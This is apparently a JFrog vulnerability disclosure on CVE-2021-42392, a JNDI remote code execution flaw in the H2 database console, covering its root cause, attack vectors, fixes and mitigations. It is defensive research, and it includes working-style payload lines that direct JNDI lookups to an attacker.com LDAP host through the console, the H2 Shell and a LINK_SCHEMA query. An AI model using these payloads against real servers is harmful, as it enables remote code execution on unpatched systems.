@@ -1,0 +1,151 @@
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214525_901499\JNDIUnauthenticatedRCEinH2DatabaseConsole863x3001.png
+
+Update 07/01/22 – Added credit to researcher @pyn3rd for similar independent previous findings in Acknowledgements section
+A short preamble
+Very recently, the JFrog security research team has disclosed an issue in the H2 database console which was issued a critical CVE – CVE-2021-42392. This issue has the same root cause as the infamous Log4Shell vulnerability in Apache Log4j (JNDI remote class loading).
+H2 is a very popular open-source Java SQL database offering a lightweight in-memory solution that doesn’t require data to be stored on disk. This makes it a popular data storage solution for various projects from web platforms like Spring Boot to IoT platforms like ThingWorks. The com.h2database:h2 package is part of the top 50 most popular Maven packages, with almost 7000 artifact dependencies.
+Due to the current sensitivities around anything (Java) JNDI-related, we want to clarify a few of the conditions and configurations that must be present in order to be at risk before getting into the technical details of our H2 vulnerability findings.
+Although this is a critical issue with a similar root cause, CVE-2021-42392 should not be as widespread as Log4Shell (CVE-2021-44228) due to the following factors:
+
+Unlike Log4Shell, this vulnerability has a “direct” scope of impact. This means that typically the server that processes the initial request (the H2 console) will be the server that gets impacted with RCE. This is less severe compared to Log4Shell since the vulnerable servers should be easier to find.
+On vanilla distributions of the H2 database, by default the H2 console only listens to localhost connections – making the default setting safe. This is unlike Log4Shell which was exploitable in the default configuration of Log4j. However – it’s worth noting the H2 console can easily be changed to listen to remote connections as well.
+Many vendors may be running the H2 database, but not running the H2 console. Although there are other vectors to exploit this issue other than the console, these other vectors are context-dependent and less likely to be exposed to remote attackers.
+That being said, if you are running an H2 console which is exposed to your LAN (or worse, WAN) this issue is extremely critical (unauthenticated remote code execution) and you should update your H2 database to version 2.0.206 immediately.
+We have also observed that many developer tools are relying on the H2 database and specifically exposing the H2 console (some examples are included later in the blog post). The recent trend of supply chain attacks targeting developers, such as malicious packages in popular repositories, emphasizes the importance of developer tools being made secure for all reasonable use cases. We hope that many H2-dependent developer tools will also be safer after this fix is applied.
+Why are we scanning for JNDI flaws?
+One of our key takeaways from the Log4Shell vulnerability incident was that due to the widespread usage of JNDI, there are bound to be more packages that are affected by the same root cause as Log4Shell – accepting arbitrary JNDI lookup URLs. Thus, we’ve adjusted our automated vulnerability detection framework to take into consideration the javax.naming.Context.lookup function as a dangerous function (sink) and unleashed the framework onto the Maven repository to hopefully find issues similar to Log4Shell.
+One of the first validated hits we got was on the H2 database package. After confirming the issue we reported it to the H2 maintainers, who promptly fixed it in a new release and created a critical GitHub advisory. Subsequently, we’ve also issued a critical CVE – CVE-2021-42392.
+In this blogpost, we will present several attack vectors that we’ve found in the H2 database that allow triggering a remote JNDI lookup, with one of the vectors allowing for unauthenticated remote code execution.
+Vulnerability root cause – JNDI remote class loading
+In a nutshell, the root cause is similar to Log4Shell – several code paths in the H2 database framework pass unfiltered attacker-controlled URLs to the javax.naming.Context.lookup function, which allows for remote codebase loading (AKA Java code injection AKA remote code execution).
+Specifically, the org.h2.util.JdbcUtils.getConnection method takes a driver class name and database URL as parameters. If the driver’s class is assignable to the javax.naming.Context class, the method instantiates an object from it and calls its lookup method:
+else if (javax.naming.Context.class.isAssignableFrom(d)) {
+    // JNDI context
+    Context context = (Context) d.getDeclaredConstructor().newInstance();
+    DataSource ds = (DataSource) context.lookup(url);
+    if (StringUtils.isNullOrEmpty(user) && StringUtils.isNullOrEmpty(password)) {
+        return ds.getConnection();
+    }
+    return ds.getConnection(user, password);
+}
+Supplying a driver class such as javax.naming.InitialContext and a URL such as ldap://attacker.com/Exploit will lead to remote code execution.
+We can’t imagine there is anyone on Earth that isn’t familiar with this attack flow by now, but a visualization may still be helpful –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214525_901499\1_attackflow.png
+
+CVE-2021-42392 attack vectors
+H2 console – non-context-dependent, unauthenticated RCE
+The most severe attack vector of this issue is through the H2 console.
+The H2 database contains an embedded web-based console, which allows easy management of the database. It’s available by default on http://localhost:8082 when running the H2 package JAR –
+java -jar bin/h2.jar
+Or, on Windows, through the Start menu –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214525_901499\2_Windownsstartmenu.png
+
+Additionally, when H2 is used as an embedded library, the console can be started from Java –
+h2Server = Server.createWebServer("-web", "-webAllowOthers", "-webPort", "8082");
+h2Server.start();
+Access to the console is protected by a login form, which allows passing the “driver” and “url” fields to the corresponding fields of JdbcUtils.getConnection. This leads to unauthenticated RCE, since the username and password are not validated before performing the lookup with the potentially malicious URL.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214525_901499\3_Loginform.png
+
+By default, the H2 console can be accessed from the localhost only. This option can be changed either through the console’s UI:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214525_901499\4_H2ConsolePreferencesUI.png
+
+Or via a command line argument: -webAllowOthers.
+Unfortunately, we’ve observed that some third-party tools relying on the H2 database will run the H2 console exposed to remote clients by default. For example, the JHipster framework also exposes the H2 console, and by default sets the webAllowOthers property to true:
+# H2 Server Properties
+0=JHipster H2 (Memory)|org.h2.Driver|jdbc\:h2\:mem\:jhbomtest|jhbomtest
+webAllowOthers=true
+webPort=8092
+webSSL=false
+As it follows from the documentation, when running your application using the JHipster framework, by default the H2 console is available at the JHipster web interface on the /h2-console endpoint:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214525_901499\5_JHipsterwebinterface.png
+
+Since the H2 database is used by so many artifacts, it’s hard to quantify how many vulnerable deployments of the H2 console exist in the wild. We consider this to be the most severe attack vector, also due to the fact that it is possible to locate WAN-facing vulnerable consoles by using public search tools.
+H2 Shell tool – context-dependent RCE
+In the built-in H2 shell, an attacker with control of the command line arguments can invoke the same vulnerable driver and url as already mentioned:
+java -cp h2*.jar org.h2.tools.Shell -driver javax.naming.InitialContext -url ldap://attacker.com:1387/Exploit
+We consider this attack vector to be highly unlikely, since custom code needs to exist that pipes remote input to these command line arguments. The attack may be more likely if such custom code exists, which gives the attacker control on a part of the command line, but also contains a parameter injection attack. See our Yamale blogpost for more details on such an attack.
+SQL-based vectors – authenticated (high privileges) RCE
+The vulnerable JdbcUtils.getConnection can also be invoked by several SQL stored procedures, available by default in the H2 database. We have identified several procedures, but they all share the same property which makes this attack vector less severe – only an authenticated (DB) admin may invoke them.
+For example, the LINK_SCHEMA stored procedure directly passes driver and URL arguments into the vulnerable function, as illustrated in the following query –
+SELECT * FROM LINK_SCHEMA('pwnfr0g', 'javax.naming.InitialContext', 'ldap://attacker.com:1387/Exploit', 'pwnfr0g', 'pwnfr0g', 'PUBLIC');
+Since the stored procedure is limited to DB admins only, we believe the most likely attack vector would be the escalation of a separate SQL injection flaw to RCE.
+How can I check if I’m vulnerable to CVE-2021-42392?
+Network administrators can scan their local subnets for open instances of the H2 console with nmap, for example –
+nmap -sV --script http-title --script-args "http-title.url=/" -p80,443,8000-9000 192.168.0.0/8 | grep "H2 Console"
+(The default console endpoint in vanilla installations is “/”, this may be different in H2 consoles deployed via 3rd-party tools)
+Any returned servers are highly likely to be exploitable.
+As mentioned above, there are other attack vectors, but remote exploitation through them is much less likely. In any case we suggest upgrading the H2 database (see “Suggested Fix”).
+How did JFrog detect CVE-2021-42392?
+The issue can be detected via data flow analysis (DFA), when defining Java’s built-in HttpServlet.doGet/doPost methods as a user input source (specifically the 1st req argument), and the aforementioned javax.naming.Context.lookup method (which performs JNDI lookup) as a dangerous function/sink.
+The data flow in this case is fairly straightforward, albeit requiring the tracing of some class fields. The variables marked in red represent the traced data –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214525_901499\code1.png
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214525_901499\code2.png
+
+
+What is the suggested fix for CVE-2021-42392?
+We recommend all users of the H2 database to upgrade to version 2.0.206, even if you are not directly using the H2 console. This is due to the fact that other attack vectors exist, and their exploitability may be difficult to ascertain.
+Version 2.0.206 fixes CVE-2021-42392 by limiting JNDI URLs to use the (local) java protocol only, which denies any remote LDAP/RMI queries. This is similar to the fix applied in Log4j 2.17.0.
+How can CVE-2021-42392 be mitigated?
+The best fix for the vulnerability is to upgrade the H2 database.
+For vendors that are currently unable to upgrade H2, we offer the following mitigation options:
+
+Similarly to the Log4Shell vulnerability, newer versions of Java contain the trustURLCodebase mitigation that will not allow remote codebases to be loaded naively via JNDI. Vendors may wish to upgrade their Java (JRE/JDK) version to enable this mitigation.
+
+This mitigation is enabled by default on the following versions of Java (or any later version) –
+
+6u211
+7u201
+8u191
+11.0.1
+
+However, this mitigation is not bulletproof, as it can be bypassed by sending a serialized “gadget” Java object through LDAP, as long as the respective “gadget” class is included in the classpath (depends on the server that runs the H2 database). For more information, please see “Using serialized Java Objects with local gadget classes” from our Log4Shell blog post.
+
+6u211
+7u201
+8u191
+11.0.1
+When the H2 console Servlet is deployed on a web server (not using the standalone H2 web server), a security constraint can be added that will allow only specific users access to the console page. A suitable configuration example can be found here.
+Acknowledgements
+We would like to thank the H2 database maintainers for validating and fixing these issues extremely quickly and for responsibly creating a security advisory for the issue.
+We would like to give credit to the researcher @pyn3rd that showed a finding similar to one of the attack vectors mentioned here, before this publication. Specifically the fact that Spring Boot is susceptible to the H2 console JNDI issue, under non-default configuration.
+
+JFrog’s research efforts were completely independent to this finding, which wasn’t spotted by our research team nor the H2 maintainers, possibly due to the fact that no official advisories were published and that the publication wasn’t in English (which affects search results).
+
+Since our research highlights the root cause of the issue, and was disclosed properly to the H2 maintainers (which weren’t aware of any previous findings) – the aforementioned fixed version of the H2 database, 2.0.206, was created based on our disclosure and supplied patch.
+
+We feel that upgrading to a fixed version of H2 is even more important now, since some attackers may have seen the previous finding, extrapolated about the general issue, and have been using similar attack vectors for a while now.
+
+As always, we encourage security researchers to publish their findings only after contacting the maintainers and making sure a fixed version is widely available.
+Conclusion
+To conclude, we highly recommend upgrading your H2 database to the latest version, in order to avoid possible exploitation of CVE-2021-42392.
+The JFrog Security Research team is continuously scanning for similar JNDI vulnerabilities, both for responsible disclosure purposes and for improving our future zero-day detection capabilities for our JFrog Xray customers.
+To the best of our knowledge, CVE-2021-42392 is the first JNDI-related unauthenticated RCE vulnerability to be published since Log4Shell, but we suspect it won’t be the last.
+Stay tuned to our blog for more disclosures and technical analyses that will help you protect your software supply chains from future attacks.
+In the meantime, explore how you can discover and mitigate Log4j vulnerabilities in your software supply chain using the JFrog platform.
+javax.naming.Context.lookup
+javax.naming.Context.lookup
+org.h2.util.JdbcUtils.getConnection
+javax.naming.Context
+javax.naming.InitialContext
+ldap://attacker.com/Exploit
+JdbcUtils.getConnection
+-webAllowOthers
+webAllowOthers
+true
+/h2-console
+driver
+url
+JdbcUtils.getConnection
+HttpServlet.doGet/doPost
+javax.naming.Context.lookup
+java
+trustURLCodebase
+
+
+6u211
+7u201
+8u191
+11.0.1
+However, this mitigation is not bulletproof, as it can be bypassed by sending a serialized “gadget” Java object through LDAP, as long as the respective “gadget” class is included in the classpath (depends on the server that runs the H2 database). For more information, please see “Using serialized Java Objects with local gadget classes” from our Log4Shell blog post.
